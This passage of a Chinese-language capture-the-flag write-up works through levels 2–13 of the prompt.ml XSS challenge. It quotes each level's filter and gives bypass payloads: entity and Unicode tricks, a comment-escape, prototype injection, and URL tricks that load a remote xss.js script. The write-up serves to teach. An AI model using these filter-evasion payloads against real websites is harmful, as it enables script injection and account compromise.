id="第2关"><a href="#第2关" class="headerlink" title="第2关"></a>第2关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这里过滤了<code>[]=(</code>主要是想破坏<code>prompt(1)</code>的结构。</p><p>但是我们可以通过<code>&amp;#28;</code>HTML实体编码，将<code>(</code>编码，现在只需要一个能够将实体编码提前编码的标签或者功能即可。</p><blockquote><p><code>&lt;svg&gt;</code>标签 可以将HTML实体编码，先进行解析再加入标签！</p></blockquote><p>于是我们可以有这样的payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>另外，我们也可以利用js的<code>eval.call()</code>函数，该函数用于调用js函数，我们可以利用<code>$&#123;&#39;&#39;&#125;</code>解析<strong>16进制或者unicode</strong>，与利用HTML实体替换<code>(</code>是一样的思路。</p><blockquote><p>``是换行字符串,</p><p>${}是代码片段,可以执行js代码. </p><p>eval是可以把str转换为js代码执行的方法.</p><p><code>**call()**</code> 方法使用一个指定的 <code>this</code> 值和单独给出的一个或多个参数来调用一个函数。</p><p>自ES2016起，带标签的模版字面量遵守以下转义序列的规则：</p><ul><li>Unicode字符以”\u”开头，例如<code>\u00A9</code></li><li>Unicode码位用”\u{}”表示，例如<code>\u&#123;2F804&#125;</code></li><li>十六进制以”\x”开头，例如<code>\xA9</code></li><li>八进制以”&quot;和数字开头，例如<code>\251</code></li></ul><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings">MDN-模板字符串</a></p></blockquote><p>于是我们也可以使用这样的payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;eval.call&#96;$&#123;&#39;prompt\x281\x29&#39;&#125;&#96;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval.call&#96;$&#123;&#39;prompt\u00281\u0029&#39;&#125;&#96;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="第3关"><a href="#第3关" class="headerlink" title="第3关"></a>第3关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential comment end delimiters</span></span><br><span class="line">    input = input.replace(<span class="regexp">/-&gt;/g</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// comment the input to avoid script execution</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;!-- &#x27;</span> + input + <span class="string">&#x27; --&gt;&#x27;</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>啊这，学习了。。。</p><p><code>&lt;!--...--&gt;</code>我们知道是注释，但是这样也是可以的<code>&lt;!--...--!&gt;</code>，这个我真没想到，也并没有找到相关信息==、</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--!&gt;&lt;img src&#x3D;1 onerror&#x3D;prompt(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="第4关"><a href="#第4关" class="headerlink" title="第4关"></a>第4关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid resource.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>这里需要绕过<strong>同源的正则过滤</strong>，正则中显然是不允许调用<code>https:prompt.ml</code>以外的网站资源，但是由于http协议存在这样的用法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;username:password@hostname</span><br></pre></td></tr></table></figure><p>所以，我们可以通过@来绕过这个正则。即<code>https://prompt.ml/@ourhost.com</code>这样就可以将<code>prompt.ml/</code>作为username。<br>但是实际上username不允许有<code>/</code>，出题者可能也是考虑到了这一点，加了<code>decodeURIComponent</code>，这样我们可以将<code>prompt.ml%2f</code>作为用户名进行绕过，最后的payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;prompt.ml%2f@ourhost&#x2F;xss.js</span><br><span class="line"></span><br><span class="line">xss.js</span><br><span class="line">&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="第5关"><a href="#第5关" class="headerlink" title="第5关"></a>第5关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter &quot;&gt;&quot; and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">&#x27;_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;input value=&quot;&#x27;</span> + input + <span class="string">&#x27;&quot; type=&quot;text&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure><p>将<code>&gt; ,onxxxx= ，focus</code>替换为_, 我们可以使用type将属性覆盖为image，并且在html中，属性描述不在同一行并不影响解析，因此可以利用换行以及type覆盖类型构造onerror格式的xss</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;type&#x3D;image src&#x3D;# onerror</span><br><span class="line">&#x3D;&quot;prompt(1)</span><br></pre></td></tr></table></figure><h2 id="第6关"><a href="#第6关" class="headerlink" title="第6关"></a>第6关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let&#x27;s do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">&#x27;post&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">&#x27;input&#x27;</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">&#x27;value&#x27;</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">&#x27;                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write(&quot;Action forbidden.&quot;)               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        &#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid form data.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>通过注释和代码，我们可以知道，这段代码是处理一个post请求，形式是：<code>http://httpbin.org#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</code>具体过程是先提取url构造form表单，url赋值给form标签中的action，然后post内容加成input标签。<code>action=&quot;javascript:alert(1)&quot;</code>的内容，但是后面还过滤了<code>document.form[0].action</code>内容，过滤了<code>script</code>和<code>data</code>。</p><p>也就是说，如果是这样的话：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br></pre></td></tr></table></figure><p>就会因为这样的if判断，<code>script:</code>会把其判断到了<code>Action forbidden.</code>：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:prompt(1)&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Matt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="javascript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;Action forbidden.&quot;</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   </span><br></pre></td></tr></table></figure><p>可以通过增加一个<code>action</code>的post请求，这样过滤<code>action</code>就会过滤另一个子级tag<code>&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;</code>：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;javascript:prompt(1)&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Matt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>                                                  </span><br><span class="line"><span class="javascript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">&quot;Action forbidden.&quot;</span>)               </span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span>              </span><br></pre></td></tr></table></figure><p>最终payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="第7关"><a href="#第7关" class="headerlink" title="第7关"></a>第7关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;p class=&quot;comment&quot; title=&quot;&#x27;</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">&#x27;&quot;&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;).join(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;     </span><br></pre></td></tr></table></figure><p>可以通过<code>#</code>来分割，结合注释，感觉还是大有可为的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;&#x2F;*#*&#x2F;prompt&#x2F;*#*&#x2F;(1)&#x2F;*#*&#x2F;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&quot;&gt;&lt;svg&#x2F;a&#x3D;#&quot;onload&#x3D;&#39;&#x2F;*#*&#x2F;prompt(1)&#39;</span><br></pre></td></tr></table></figure><p>拼接之后的代码如下：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml">/*&quot;&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span> title=<span class="string">&quot;*/prompt/*&quot;</span>&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span> title=<span class="string">&quot;*/(1)/*&quot;</span>&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="javascript">&lt;p <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span> title=<span class="string">&quot;*/</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">也即：<span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="第8关"><a href="#第8关" class="headerlink" title="第8关"></a>第8关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// prevent input from getting out of comment</span></span><br><span class="line">    <span class="comment">// strip off line-breaks and stuff</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\r\n&lt;/&quot;]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    // console.log(&quot;&#x27;</span> + input + <span class="string">&#x27;&quot;);        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>去除了一些字符<code>[\r\n&lt;/&quot;]</code></p><p>想要使代码执行，必须逃脱出双引号或者本行，那么逃逸利用了unicode。</p><p>首先用chrome F12打开开发者选项，然后利用console模块，输入:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;\u2028prompt(1)\u2028--&gt;&#39;</span><br></pre></td></tr></table></figure><p>就生成了payload。</p><p><img src="http://image.v0w.top/Blog/2020-10-16-151927.jpg"></p><p><img src="http://image.v0w.top/Blog/2020-10-16-152042.jpg"></p><h2 id="第9关"><a href="#第9关" class="headerlink" title="第9关"></a>第9关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// filter potential start-tags</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">&#x27;&lt;_$1&#x27;</span>);</span><br><span class="line">    <span class="comment">// use all-caps for heading</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample input: you shall not pass! =&gt; YOU SHALL NOT PASS!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;h1&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>本题会将输入的内容全部转换为大写，而且还会将<code>&lt;script&gt;</code>转换为<code>&lt;_SCRIPT&gt;</code></p><p>toUpperCase()：把字符串转换为大写，（而且还可以转换一些unicode字符）</p><p>本题将 ſ 转换为S,这里的ſ字符应该是某个国家的unicode字符，转换后恰好对应s，因此可以完成绕过。</p><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; ſcript&#x2F; ſrc&#x3D;&quot;http:&#x2F;&#x2F;localhost&#x2F;xss.js&quot;&gt;&lt;&#x2F; ſcript&gt;</span><br></pre></td></tr></table></figure><h2 id="第10关"><a href="#第10关" class="headerlink" title="第10关"></a>第10关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ ┻━┻</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line">    <span class="comment">// ┬──┬ ﻿ノ( ゜-゜ノ) chill out bro</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (╯°□°）╯︵ /(.□. \）DONT FLIP ME BRO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;       </span><br></pre></td></tr></table></figure><p>可以想到的用字符分割prompt从而绕过第一个过滤</p><p>比较有趣的是刚好<code>单引号</code>被替换成空。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p&#39;rompt(1)</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-10-16-162259.jpg"></p><h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">&#x27;&#123;&quot;action&quot;:&quot;login&quot;,&quot;message&quot;:&quot;Welcome back, &#x27;</span> + memberName + <span class="string">&#x27;.&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly &quot;parse&quot; data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = &#x27;</span> + dataString + <span class="string">&#x27;;          \n\</span></span><br><span class="line"><span class="string">    if (data.action === &quot;login&quot;)            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题正则过滤了大量的符号，基本思路是利用js的一个特性进行绕过。可以通过下面这个例子来理解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;var array&#x3D;&#123;&quot;n&quot;:1,&quot;n&quot;:2&#125;</span><br><span class="line"> undefined</span><br><span class="line">&gt;array.n</span><br><span class="line"> 2</span><br></pre></td></tr></table></figure><blockquote><p>通过上面的例子我们知道，在js中，键名相同，输出后值是后面的变量的值，基本的构造思路是构造 <code>&quot;,&quot;message&quot;:&quot;prompt(1)&quot; </code>为了绕过正则，需要利用js的一个神奇的语法。</p><p>在js中,<code>(prompt(1)) instaneof &quot;1&quot;和(prompt(1)) in &quot;1&quot;</code>是可以成功弹窗的（可以自己在console试一下），其中双引号里面的1可以是任何字符，这里的in或者instanceof是运算符，所以可以有这样的语法结构。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in</a></p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;(prompt(1))instanceof&quot;</span><br><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure><h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">&#x27;alert&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;&#x27;</span> + input + <span class="string">&#x27;&lt;/script&gt; &#x27;</span>;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure><blockquote><p>和第10关不同，这里或许需要通过<code>toString</code>进行绕过</p><p><code>parseInt(string,radix)</code>:解析一个字符串并返回一个整数</p><p><code>toString()</code>:把一个逻辑值转换为字符串并返回结果</p><p>基本思路便是将<code>prompt</code>进行转换，但是注意其中字母最大的是t，也就是说至少要30进制才能完全转换(0-9a-z)</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">parseInt(&quot;prompt&quot;,36)</span><br><span class="line">1558153217</span><br><span class="line">(1558153217).toString(36)</span><br><span class="line">&quot;prompt&quot;</span><br></pre></td></tr></table></figure><p>字符串就有了，所以<strong>Payload</strong>：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval((1558153217).toString(36))(1)</span><br></pre></td></tr></table></figure><h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;&quot;source&quot;:&quot;http://sandbox.prompt.ml/PROMPT.JPG&quot;&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">&#x27;http://placehold.it/350x150&#x27;</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off &quot;</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#x27;</span>.replace(<span class="string">&#x27;&#123;&#123;source&#125;&#125;&#x27;</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid image data.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        </span><br></pre></td></tr></table></figure><p>本题需要了解一个js的proto属性</p><p>proto：每个对象都会在内部初始化这个属性，当访问对象的某个属性时，如果不存在这个属性，便会去proto里寻找这个属性。</p><p>可以在console做个实验</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt;test=&#123;<span class="string">&quot;r&quot;</span>:<span class="number">1</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;r&quot;</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line"><span class="built_in">Object</span> &#123; <span class="attr">r</span>: <span class="number">1</span> &#125;</span><br><span class="line">&gt;test.r</span><br><span class="line"><span class="number">1</span><span class="comment">// 属性存在就返回属性值</span></span><br><span class="line">&gt;<span class="keyword">delete</span> test.r</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt;test.r</span><br><span class="line"><span class="number">2</span><span class="comment">// 属性不存在就去找__proto__,返回其中属性值</span></span><br><span class="line">&gt;<span class="keyword">delete</span> test.__proto__.r</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">&gt;test.r</span><br><span class="line"><span class="literal">undefined</span></span><br></pre></td></tr></table></figure><p>根据这样的特点，我们可以初步构造payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;source&quot;:&quot;#&#39;&quot;,&quot;__proto__&quot;: &#123;&quot;source&quot;:&quot;onerror&#x3D;prompt(1)&gt;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是这个payload可以绕过这段：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (&#x2F;[^\w:\&#x2F;.]&#x2F;.test(config.source)) &#123;</span><br><span class="line">            delete config.source;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>绕不过这段</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var source &#x3D; config.source.replace(&#x2F;&quot;&#x2F;g, &#39;&#39;);</span><br><span class="line">return &#39;&lt;img src&#x3D;&quot;&#123;&#123;source&#125;&#125;&quot;&gt;&#39;.replace(&#39;&#123;&#123;source&#125;&#125;&#39;, source);</span><br></pre></td></tr></table></figure><p>于是便要利用replace的一个个人认为比较奇怪的特性。</p><p>替换字符串可以插入下面的特殊变量名：</p><table><thead><tr><th>变量名</th><th>代表的值</th></tr></thead><tbody><tr><td>$$</td><td>插入一个 